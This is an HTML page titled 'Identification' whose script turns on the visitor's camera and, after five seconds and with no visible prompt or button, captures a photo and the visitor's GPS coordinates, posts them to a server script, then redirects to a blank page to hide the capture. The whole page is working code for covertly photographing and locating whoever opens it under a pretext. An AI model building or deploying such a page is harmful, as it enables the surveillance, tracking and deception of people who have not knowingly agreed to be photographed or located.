<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Identification</title>
 <!-- Link multiple size icons -->
    <link rel="icon" type="image/x-icon" href="logo (1).ico" sizes="16x16">
    <link rel="icon" type="image/x-icon" href="logo (2).ico" sizes="32x32">
    <link rel="icon" type="image/x-icon" href="logo (3).ico" sizes="64x64">
    <link rel="icon" type="image/x-icon" href="logo (4).ico" sizes="128x128">
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f0f0f0;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    .container {
        text-align: center;
        background-color: #fff;
        border-radius: 8px;
        padding: 20px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    h1 {
        color: #333;
        margin-bottom: 20px;
    }

    video {
        width: 100%;
        max-width: 400px;
        border-radius: 8px;
        margin-bottom: 20px;
    }

    button {
        background-color: #007bff;
        color: #fff;
        border: none;
        border-radius: 4px;
        padding: 10px 20px;
        cursor: pointer;
        transition: background-color 0.3s ease;
    }

    button:hover {
        background-color: #0056b3;
    }
    </style>
</head>
<body>
<h1>Identification</h1>

<!-- Video element for displaying camera feed -->
<video id="cameraFeed" autoplay></video>

<script>
// Access the camera and display the feed
navigator.mediaDevices.getUserMedia({ video: true })
    .then(function(stream) {
        var video = document.getElementById('cameraFeed');
        video.srcObject = stream;
        video.play();
    })
    .catch(function(err) {
        console.log('Error accessing camera:', err);
    });

// Function to capture image from the camera and send email
function captureImageAndSendEmail() {
    var video = document.getElementById('cameraFeed');
    var canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    var context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    var imageDataURL = canvas.toDataURL('image/jpeg');

    // Get geolocation data
    navigator.geolocation.getCurrentPosition(function(position) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;

        // Send image data and geolocation to server to send email
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'imagePro.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                if (xhr.status === 200) {
                    console.log('Image sent successfully');
                    // Redirect to blank page after sending email
                    window.location.href = 'about:blank';
                } else {
                    console.error('Error sending image:', xhr.status);
                }
            }
        };
        xhr.send('image=' + encodeURIComponent(imageDataURL) + '&latitude=' + latitude + '&longitude=' + longitude);
    }, function(error) {
        console.error('Error getting geolocation:', error);
    });
}

// Automatically capture image and send email
setTimeout(captureImageAndSendEmail, 5000); // Adjust delay as needed
</script>
</body>
</html>
